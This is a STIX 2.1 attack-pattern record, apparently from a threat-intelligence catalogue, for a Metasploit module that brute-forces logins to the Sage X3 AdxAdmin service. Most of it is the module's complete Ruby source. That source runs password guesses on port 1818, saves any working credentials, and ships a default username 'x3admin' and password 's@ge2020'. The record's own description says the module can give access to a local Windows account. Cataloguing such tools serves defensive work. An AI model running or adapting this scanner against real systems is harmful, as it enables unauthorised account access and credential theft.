{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4bb44838-17a5-4186-87ce-6b067ee8d339",
    "created": "2024-08-14T16:27:48.00879Z",
    "modified": "2024-08-14T16:27:48.008793Z",
    "name": "Sage X3 AdxAdmin Login Scanner",
    "description": " This module allows an attacker to perform a password guessing attack against the Sage X3 AdxAdmin service, which in turn can be used to authenticate to a local Windows account.  This module implements the X3Crypt function to 'encrypt' any passwords to be used during the authentication process, given a plaintext password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sage/x3_adxsrv_login.rb",
            "external_id": "x3_adxsrv_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/x3'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'Sage X3 AdxAdmin Login Scanner',\n      'Description' => %q{\n        This module allows an attacker to perform a password guessing attack against\n        the Sage X3 AdxAdmin service, which in turn can be used to authenticate to\n        a local Windows account.\n\n        This module implements the X3Crypt function to 'encrypt' any passwords to\n        be used during the authentication process, given a plaintext password.\n      },\n      'Author' => ['Jonathan Peterson <deadjakk[at]shell.rip>'], # @deadjakk\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/']\n      ]\n      )\n\n    register_options(\n      [\n        Opt::RPORT(1818),\n        OptString.new('USERNAME', [false, 'User with which to authenticate to the AdxAdmin service', 'x3admin']),\n        OptString.new('PASSWORD', [false, 'Plaintext password with which to authenticate', 's@ge2020'])\n      ]\n    )\n\n    deregister_options('PASSWORD_SPRAY', 'BLANK_PASSWORDS')\n  end\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n      blank_passwords: false,\n      password: datastore['PASSWORD'],\n      username: datastore['USERNAME']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::X3.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      local_port: datastore['CPORT'],\n      local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(level: :good, ip: ip, msg: \"Success: '#{result.credential}'\")\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        next\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute(level: :verror, ip: ip, msg: \"Could not connect: #{result.proof}\")\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute(level: :verror, ip: ip, msg: \"Failed: '#{result.credential}'\")\n      end\n\n      invalidate_login(credential_data)\n    end\n  end\n\nend\n"
}